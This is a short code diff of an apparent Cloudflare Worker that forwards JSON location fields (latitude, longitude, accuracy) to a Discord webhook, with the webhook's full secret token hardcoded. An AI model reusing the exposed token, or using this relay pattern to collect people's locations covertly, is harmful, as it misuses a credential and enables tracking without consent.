@@ -2,11 +2,11 @@ addEventListener('fetch', event => {
   event.respondWith(handleRequest(event.request))
 })
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1455587749133422779/Dj7Kic95o6avV_I-m0TzKVXGqmuFuO59X9B3YD4cnfjPlwSRcLHcKrvSX367FJnd9UUP"
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1455587749133422779/Dj7Kic95o6avV_I-m0TzKVXGqmuFuO59X9B3YD4cnfjPlwSRcLHcKrvSX367FJnd9UUP" // Replace with your webhook
 
 async function handleRequest(request) {
   try {
-    const data = await request.json()
+    const data = await request.json() // {lat, lon, acc}
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
